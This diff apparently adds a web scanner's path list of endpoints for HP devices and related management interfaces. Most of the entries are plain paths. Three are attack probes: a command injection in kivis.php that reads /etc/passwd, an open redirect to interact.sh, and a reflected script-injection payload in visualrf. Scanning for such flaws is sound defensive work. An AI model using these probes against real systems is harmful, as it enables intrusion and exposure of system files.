@@ -1,0 +1,16 @@
+/rest/v1/AccountService/Accounts
+/linuxki/experimental/vis/kivis.php?type=kitrace&pid=0;echo%20START;cat%20/etc/passwd;echo%20END;
+/
+/SSI/Auth/ip_snmp.htm
+
+/hp/device/webAccess/index.htm?content=security
+/html/login.html
+/sm935/index.do
+/sm/ess.do
+/html/index.html
+/hp/device/this.LCDispatcher
+/hp/device/DeviceInformation/View
+/chpstrt.php?chppath=Home
+/red2301.html?RedirectUrl=http://interact.sh
+/visualrf/group_list.xml?aps=1&start=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&end=500&match
+/gsearch.php.en?prod=
